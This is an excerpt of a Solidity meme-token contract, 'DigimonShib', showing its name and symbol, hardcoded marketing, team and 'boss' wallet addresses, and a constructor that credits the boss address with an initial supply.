...
contract DigimonShib is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "DigimonShib";
    string private _symbol = "DigimonShib";
    uint8 private _decimals = 9;

    address payable private marketWall = payable(0xEb2cB61953CBfEE2A7D4B276f06E9a8779cb5992); 
    address payable private teamWalletAddress = payable(0x4705b7a6b99a0E3F8A9c1a378A0E0BCE1D1942E6); 
	address payable private boss = payable(0x5cC15c0507D848Fa7740EB340b7A6feeBCb3C0E2); 
    ...
    constructor (uint256 serviceFee_,uint256[2] memory buyFeeSetting_) {
		...
		_tOwned[boss] = 1* 10**11 * 10**_decimals;
